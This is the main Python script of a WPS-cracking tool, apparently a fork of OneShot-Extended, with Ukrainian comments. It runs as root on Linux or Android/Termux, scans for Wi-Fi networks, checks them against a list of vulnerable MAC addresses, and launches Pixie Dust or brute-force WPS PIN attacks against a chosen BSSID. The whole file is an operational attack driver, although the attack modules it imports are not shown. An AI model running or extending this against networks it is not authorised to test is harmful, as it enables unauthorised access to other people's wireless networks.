#!/usr/bin/env python3
# osep-final.py — остання робоча версія (18.11.2025)
import contextlib
import logging
import os
import sys
import time
from dataclasses import dataclass
from pathlib import Path
from shutil import which

import src.args as args_parser
import src.utils
from src.utils import die, isAndroid
from src.wifi.android import AndroidNetwork
from src.wifi.scanner import WiFiScanner
from src.wps.connection import Initialize as StandardWPS
from src.wps.bruteforce import Initialize as BruteforceWPS

try:
    from rich.logging import RichHandler
    RICH = True
except ImportError:
    RICH = False

# ============================ Логування ============================
if RICH:
    logging.basicConfig(level=logging.INFO, handlers=[RichHandler(show_path=False, markup=True)])
else:
    logging.basicConfig(level=logging.INFO,
                        format="%(asctime)s [%(levelname)-8s] %(message)s",
                        handlers=[logging.FileHandler("ose.log"), logging.StreamHandler()])
log = logging.getLogger("OSE")

# ============================ Конфігурація ============================
@dataclass(frozen=True)
class Config:
    interface: str
    bruteforce: bool = False
    pin: str = None
    delay: int = 0
    pixie_dust: bool = False
    show_pixie_cmd: bool = False
    pixie_force: bool = False
    pbc: bool = False
    bssid: str = None
    loop: bool = False
    clear: bool = False
    save: bool = False
    verbose: bool = False
    output_file: str = None
    vuln_list: str = "vuln.txt"
    iface_down: bool = False
    mtk_wifi: bool = False
    dts: bool = False

@dataclass
class State:
    bssid: str = None

# ============================ Cleanup manager ============================
@contextlib.contextmanager
def session_manager(cfg: Config):
    android = None
    need_restore = False
    mtk_activated = False

    try:
        # Android Wi-Fi off - тільки якщо не використовуються спеціальні режими
        if isAndroid() and not (cfg.dts or cfg.mtk_wifi):
            android = AndroidNetwork()
            android.storeAlwaysScanState()
            android.disableWifi()
            need_restore = True
            log.info("Android Wi-Fi вимкнено")

        # MediaTek patch
        if cfg.mtk_wifi:
            dev = Path("/dev/wmtWifi")
            if dev.is_char_device():
                with dev.open("w") as f:
                    f.write("1"); f.flush()
                mtk_activated = True
                log.info("MediaTek драйвер активовано")

        # Підняття інтерфейсу — в Termux спробуємо, але не помираємо при помилці
        if isAndroid():
            # В Android спробуємо підняти інтерфейс, але не критично якщо не вийде
            result = src.utils.ifaceCtl(cfg.interface, action="up")
            if result:
                log.info("Інтерфейс успішно піднято")
            else:
                log.warning("Не вдалося підняти інтерфейс в Android - це нормально")
        else:
            # У звичайному Linux вимагаємо підняття інтерфейсу
            if not src.utils.ifaceCtl(cfg.interface, action="up"):
                die(f"Не вдалося підняти {cfg.interface}")

        yield

    finally:
        if cfg.iface_down and not isAndroid():
            src.utils.ifaceCtl(cfg.interface, action="down")

        if mtk_activated:
            try:
                with Path("/dev/wmtWifi").open("w") as f:
                    f.write("0"); f.flush()
                log.info("MediaTek драйвер деактивовано")
            except:
                pass

        if need_restore and android:
            android.enableWifi()
            log.info("Android Wi-Fi увімкнено назад")

# ============================ Головний цикл ============================
def main_loop(cfg: Config, state: State):
    while True:
        if cfg.clear:
            src.utils.clearScreen()

        attacker = (
            BruteforceWPS(cfg.interface)
            if cfg.bruteforce else
            StandardWPS(
                interface=cfg.interface,
                write_result=cfg.output_file is not None,
                save_result=cfg.save,
                print_debug=cfg.verbose
            )
        )

        try:
            if cfg.pbc:
                attacker.singleConnection(pbc_mode=True)
            else:
                if not state.bssid and not cfg.bssid:
                    log.info("Сканування мереж...")
                    
                    # Для Android пропонуємо альтернативні методи
                    if isAndroid():
                        log.info("У Android сканування може бути обмеженим.")
                        log.info("Рекомендується:")
                        log.info("1. Використовувати --bssid для прямого вказання мережі")
                        log.info("2. Використовувати --dts або --mtk-wifi для кращої сумісності")
                        log.info("3. Ввести BSSID вручну")
                    
                    vuln_macs = []
                    if Path(cfg.vuln_list).exists():
                        try:
                            vuln_macs = Path(cfg.vuln_list).read_text().splitlines()
                        except Exception as e:
                            log.warning(f"Не вдалося прочитати vuln_list: {e}")
                    
                    try:
                        scanner = WiFiScanner(cfg.interface, vuln_macs)
                        state.bssid = scanner.promptNetwork()
                    except Exception as e:
                        log.error(f"Помилка сканування: {e}")
                        state.bssid = None

                    # Перевірка, чи була вибрана мережа
                    if state.bssid is None:
                        log.error("Мережа не вибрана. Сканування не вдалося.")
                        
                        # Пропонуємо ввести BSSID вручну
                        if isAndroid():
                            manual_bssid = input("\nВведіть BSSID мережі вручну (формат: AA:BB:CC:DD:EE:FF) або Enter для пропуску: ").strip()
                            if manual_bssid:
                                # Перевірка формату BSSID
                                if len(manual_bssid) == 17 and manual_bssid.count(':') == 5:
                                    state.bssid = manual_bssid.upper()
                                    log.info(f"Використовується BSSID: {state.bssid}")
                                else:
                                    log.error("Невірний формат BSSID. Має бути AA:BB:CC:DD:EE:FF")
                        
                        if not state.bssid:
                            if cfg.loop:
                                log.info("Повторення сканування через 10 секунд...")
                                time.sleep(10)
                                continue
                            else:
                                break

                target = state.bssid or cfg.bssid

                # Додаткова перевірка на наявність BSSID
                if target is None:
                    log.error("BSSID не вказано. Неможливо продовжити.")
                    if cfg.loop:
                        log.info("Повторення сканування через 10 секунд...")
                        time.sleep(10)
                        continue
                    else:
                        break

                if cfg.bruteforce:
                    attacker.smartBruteforce(target, cfg.pin, cfg.delay)
                else:
                    attacker.singleConnection(
                        bssid=target,
                        pin=cfg.pin,
                        pixiemode=cfg.pixie_dust,
                        showpixiecmd=cfg.show_pixie_cmd,
                        pixieforce=cfg.pixie_force
                    )

            if not cfg.loop:
                break
            state.bssid = None

        except KeyboardInterrupt:
            log.warning("Перервано користувачем")
            if cfg.loop and input("\nВийти повністю? (Y/n): ").strip().lower() != "n":
                sys.exit(0)
        except Exception as e:
            log.error(f"Помилка під час виконання: {e}")
            if cfg.loop:
                log.info("Повторення через 10 секунд...")
                time.sleep(10)
                continue
            else:
                break

# ============================ Запуск ============================
def main():
    if os.getuid() != 0:
        die("Потрібен root (su)")
    if not which("pixiewps"):
        die("pixiewps не знайдено! pkg install pixiewps")

    src.utils.migrate_and_create_dirs()
    args = args_parser.parseArgs()

    # Універсальне визначення флагів (працює з будь-яким форком)
    pixie_dust = getattr(args, "pixie_dust", False) or getattr(args, "K", False)
    save = getattr(args, "save", False) or getattr(args, "w", False)
    loop = getattr(args, "loop", False) or getattr(args, "l", False)
    clear = getattr(args, "clear", False) or getattr(args, "s", False)

    cfg = Config(
        interface=args.interface,
        bruteforce=getattr(args, "bruteforce", False),
        pin=args.pin,
        delay=getattr(args, "delay", 0) or 0,
        pixie_dust=pixie_dust,
        show_pixie_cmd=getattr(args, "show_pixie_cmd", False),
        pixie_force=getattr(args, "pixie_force", False) or getattr(args, "X", False),
        pbc=getattr(args, "pbc", False),
        bssid=args.bssid,
        loop=loop,
        clear=clear,
        save=save,
        verbose=getattr(args, "verbose", False),
        output_file=getattr(args, "output", None),
        vuln_list=getattr(args, "vuln_list", "vuln.txt"),
        iface_down=getattr(args, "iface_down", False),
        mtk_wifi=getattr(args, "mtk_wifi", False),
        dts=getattr(args, "dts", False),
    )

    # Перевірка для Android
    if isAndroid():
        log.info("=== Android-режим ===")
        if not cfg.bssid and not (cfg.dts or cfg.mtk_wifi):
            log.warning("Для кращої роботи в Android рекомендується:")
            log.warning("1. Використовувати --bssid для прямого вказання цілі")
            log.warning("2. Використовувати --dts або --mtk-wifi для кращої сумісності")
            log.warning("3. Сканування може бути обмеженим")

    state = State(bssid=cfg.bssid)
    log.info("OneShot-Extended успішно запущено! (2025 final)")

    with session_manager(cfg):
        main_loop(cfg, state)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        log.exception(f"Критична помилка: {e}")
        sys.exit(1)